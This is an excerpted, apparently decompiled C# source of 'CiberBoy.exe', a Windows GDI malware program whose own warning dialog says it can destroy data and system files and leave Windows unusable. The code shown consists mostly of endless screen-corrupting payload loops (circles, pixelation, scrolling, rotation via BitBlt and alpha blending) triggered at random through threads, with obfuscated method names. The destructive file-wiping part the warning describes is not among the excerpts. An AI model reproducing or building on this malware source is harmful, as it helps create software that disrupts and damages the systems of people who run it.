...
public class gdi
{
  ...
  public const uint CAPTUREBLT = 1073741824 /*0x40000000*/;
  public const uint CUSTOM = 1051781;
  public static gdi.BLENDFUNCTION BlendFunction = new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 80 /*0x50*/, (byte) 0);
  ...
  private static void Main()
  {
    ...
    Console.WriteLine("by silverjetes <3");
    Console.WriteLine("03/25");
  ...
  public static void warning()
  {
    if (MessageBox.Show("!!! FINAL WARNING !!!\nTHIS IS THE LAST CHANCE TO STOP THIS PROGRAM FROM EXECUTING!\nTHIS MALWARE HAS FULL CAPACITY TO DESTROY YOUR DATA AND SYSTEM FILES!\nYOU WON'T BE ABLE TO USE WINDOWS AGAIN IF YOU PROCEED!\nThe creator of this malware is not responsible for any damage made.\nAre you absolutely sure you want to run this?", "CiberBoy.exe - !!! FINAL WARNING !!!", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
    {
      ...
      new Thread(new ThreadStart(Class1.smethod_2)).Start();
      thread.Start();
        ...
        if (random.Next(1, 15) != 2)
        {
          if (random.Next(1, 15) != 3)
          {
            if (random.Next(1, 15) == 4)
              ...
              thread9.Resume();
            else if (random.Next(1, 15) != 7)
            {
              if (random.Next(1, 16 /*0x10*/) == 8)
                thread11.Resume();
              else if (random.Next(1, 15) != 9)
              {
                if (random.Next(1, 16 /*0x10*/) == 10)
                {
                  thread13.Resume();
                  thread14.Resume();
                }
                ...
                {
                  if (random.Next(1, 15) != 12)
                  {
                    if (random.Next(1, 15) == 13)
                      thread18.Resume();
                    else if (random.Next(1, 15) != 14)
                    {
                      if (random.Next(1, 15) != 1)
                      {
                        if (random.Next(1, 15) != 2)
                              ...
                              else if (random.Next(1, 15) != 7)
                              {
                                if (random.Next(1, 16 /*0x10*/) != 8)
                                {
                                  if (random.Next(1, 15) == 9)
                                    thread12.Resume();
                                  else if (random.Next(1, 16 /*0x10*/) != 10)
                                  {
...
label_57:
  ...
  private static void smethod_1(object object_0, float float_0)
  {
    ...
    for (int index = 0; index < numArray.Length; index += 3)
    {
      ...
      numArray[index] = class2.byte_1;
      numArray[index + 1] = class2.hWjObInvb;
  ...
  private static float smethod_5(float float_0, float float_1, float float_2)
  {
    ...
    if ((double) float_2 > 360.0)
      float_2 -= 360f;
    return (double) float_2 < 60.0 ? float_0 + (float) (((double) float_1 - (double) float_0) * (double) float_2 / 60.0) : ((double) float_2 >= 180.0 ? ((double) float_2 >= 240.0 ? float_0 : float_0 + (float) (((double) float_1 - (double) float_0) * (240.0 - (double) float_2) / 60.0)) : float_1);
  }
  ...
  public static void Circles()
  {
    while (true)
    {
      ...
      try
      {
        ...
        int num1 = random.Next(width);
        int num2 = random.Next(height);
        Brush brush = (Brush) new SolidBrush(Color.FromArgb(random.Next(1, 48 /*0x30*/), random.Next(50), random.Next(50), random.Next(50)));
    ...
    while (true)
    {
      while (gdi.payloadsactivated)
      {
        ...
        for (int y2 = 0; y2 < height; y2 += 10)
        {
          try
          {
            Brush brush = (Brush) new SolidBrush(Color.FromArgb(128 /*0x80*/, random.Next(150, (int) byte.MaxValue), random.Next(150, (int) byte.MaxValue), random.Next(150, (int) byte.MaxValue)));
  ...
  public static void pixelation()
  {
    ...
    while (true)
    {
      ...
      for (int index = 0; index < 21; ++index)
      {
        ...
        IntPtr solidBrush = gdi.CreateSolidBrush(13421772U /*0xCCCCCC*/);
        gdi.SelectObject(dc, solidBrush);
        gdi.BitBlt(dc, 0, 0, width, height, dc, 0, 0, 12583114U);
        Thread.Sleep(1);
        try
  ...
  public static void diagonalscrolling()
  {
    ...
    while (true)
    {
      ...
      IntPtr hObject = gdi.SelectObject(compatibleDc, compatibleBitmap);
      gdi.BitBlt(compatibleDc, 0, 0, width, height, dc, 0, 0, 13369376U);
      gdi.GdiAlphaBlend(dc, 100, -100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128 /*0x80*/, (byte) 0));
      gdi.GdiAlphaBlend(dc, -width + 100, -100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128 /*0x80*/, (byte) 0));
      gdi.GdiAlphaBlend(dc, -width + 100, height - 100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128 /*0x80*/, (byte) 0));
      gdi.GdiAlphaBlend(dc, 100, height - 100, width, height, compatibleDc, 0, 0, width, height, new gdi.BLENDFUNCTION((byte) 0, (byte) 0, (byte) 128 /*0x80*/, (byte) 0));
      Thread.Sleep(65);
      gdi.DeleteDC(dc);
      gdi.DeleteDC(compatibleDc);
      gdi.DeleteObject(compatibleBitmap);
  ...
  public static void rotation1()
  {
    ...
    while (true)
    {
      ...
      uint[] numArray2 = new uint[2]{ 6684742U, 12255782U };
      gdi.POINT[] point_0 = new gdi.POINT[3];
      if (random.Next(2) == 1)
      {
        point_0[0].X = -20;
